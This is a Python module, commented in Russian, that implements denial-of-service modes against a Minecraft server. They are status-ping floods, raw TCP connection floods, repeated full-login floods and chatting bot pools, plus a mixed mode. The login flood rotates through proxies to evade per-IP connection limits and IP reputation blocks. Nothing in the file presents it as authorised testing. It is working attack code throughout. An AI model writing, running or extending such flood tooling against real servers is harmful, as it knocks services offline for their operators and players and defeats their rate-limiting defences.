"""
Режимы нагрузки DDoS: ping / tcp / login / bot / mixed.

Все режимы асинхронные. `ping` и `tcp` не требуют авторизации и дёшевы.
`login` постоянно делает полное handshake+login (дорого для сервера).
`bot` держит соединения живыми и пишет в чат. `mixed` смешивает их.
"""
import asyncio
import random
import socket
import time

from .mcconn import MCConn
from .bots import BotPool
from . import bypass


class Stats:
    def __init__(self):
        self.start = time.time()
        self.ok = 0
        self.fail = 0
        self.bytes = 0
        self._last = 0.0

    def add(self, ok=True, n=0):
        if ok:
            self.ok += 1
        else:
            self.fail += 1
        self.bytes += n

    def rate(self):
        now = time.time()
        dt = now - self._last
        if dt >= 1.0:
            self._last = now
            return self.ok
        return self.ok


async def ping_ddos(host, port, version, iterations=None, workers=20,
                    stop=None, stats=None, log=None):
    """Флуд status-пингом. Дёшево, бьёт по конвейеру прокси/status."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)
    done = 0

    async def worker():
        nonlocal done
        while not stop():
            c = MCConn(host, port, log=lambda *a: None)
            try:
                info = await c.status(version)
                stats.add(info is not None, 200 if info else 100)
            except Exception:
                stats.add(False, 100)
            finally:
                await c.close()
            done += 1

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)


async def tcp_ddos(host, port, iterations=None, workers=20,
                   stop=None, stats=None, log=None):
    """Флуд сырыми TCP-соединениями. Бьёт по backlog и исчерпанию файловых дескрипторов."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)

    def connect():
        try:
            s = socket.create_connection((host, port), timeout=4.0)
            s.close()
            return True, 40
        except Exception:
            return False, 10

    loop = asyncio.get_running_loop()
    async def worker():
        while not stop():
            ok, n = await loop.run_in_executor(None, connect)
            stats.add(ok, n)

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)


async def login_ddos(host, port, version, workers=20,
                     stop=None, stats=None, log=None,
                     signed=False, share_key=True, proxies=None):
    """
Повторные полные логины. Дорого: каждый раз полное login-рукопожатие.

proxies: необязательный список dict'ов прокси; каждый воркер берёт случайный
(и меняет его при ошибке), чтобы использовать разные исходящие IP — это нужно
против лимита соединений на IP и блокировок по репутации IP.
    """
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)
    plist = list(proxies or [])

    class _Pool:
        def __init__(self, items):
            self.items = items; self.idx = 0; self.dead = set()
        def take(self):
            if not self.items: return None
            for _ in range(len(self.items)):
                it = self.items[self.idx % len(self.items)]; self.idx += 1
                if id(it) not in self.dead: return it
            return None
        def mark(self, it):
            self.dead.add(id(it))
    pool = _Pool(plist)

    async def worker():
        while not stop():
            nm = f"L{random.randint(1, 99999)}"
            pk = bypass.make_profile_key(nm, share=share_key) if signed else None
            px = pool.take()
            c = MCConn(host, port, username=nm, log=lambda *a: None,
                       profile_key=pk, proxy=px,
                       offline_uuid=True)
            try:
                ok = await c.login(version, wait_play=False)
                stats.add(ok, 3000 if ok else 500)
                if ok:
                    log(f"  PLAY via {px['host']}:{px['port']}" if px else "  PLAY (direct)")
            except Exception:
                stats.add(False, 500)
                if px: pool.mark(px)
            finally:
                await c.close()
            await asyncio.sleep(random.uniform(0.05, 0.4))

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)


def bot_load(host, port, version, count=20, proxy=None, online=False,
             chat_every=8.0, log=None, signed=False, share_key=True,
             offline_uuid=None):
    """Возвращает уже запущенный BotPool (держит соединения + чаты)."""
    pool = BotPool(host, port, version, count=count, proxy=proxy,
                   online=online, log=log, chat_every=chat_every,
                   signed=signed, share_key=share_key,
                   offline_uuid=offline_uuid)
    pool.spawn(count)
    pool.start_all()
    return pool


async def mixed_ddos(host, port, version, workers=30, bot_count=10,
                     stop=None, stats=None, log=None,
                     signed=False, share_key=True, chat_every=8.0):
    """Смесь: ping + tcp + login + маленький пул ботов."""
    stats = stats or Stats()
    stop = stop or (lambda: False)
    log = log or (lambda *a: None)
    pool = bot_load(host, port, version, count=bot_count, log=log,
                    chat_every=chat_every,
                    signed=signed, share_key=share_key)

    modes = ["ping", "ping", "tcp", "login"]

    async def worker():
        while not stop():
            m = random.choice(modes)
            if m == "ping":
                c = MCConn(host, port, log=lambda *a: None)
                try:
                    info = await c.status(version)
                    stats.add(info is not None, 200)
                except Exception:
                    stats.add(False, 100)
                finally:
                    await c.close()
            elif m == "tcp":
                def connect():
                    try:
                        s = socket.create_connection((host, port), timeout=4.0)
                        s.close()
                        return True, 40
                    except Exception:
                        return False, 10
                ok, n = await asyncio.get_running_loop().run_in_executor(None, connect)
                stats.add(ok, n)
            else:
                c = MCConn(host, port, username=f"M{random.randint(1, 99999)}",
                           log=lambda *a: None)
                try:
                    ok = await c.login(version, wait_play=False)
                    stats.add(ok, 3000 if ok else 500)
                except Exception:
                    stats.add(False, 500)
                finally:
                    await c.close()
            await asyncio.sleep(random.uniform(0.02, 0.2))

    ws = [asyncio.create_task(worker()) for _ in range(workers)]
    await asyncio.gather(*ws)
    return pool
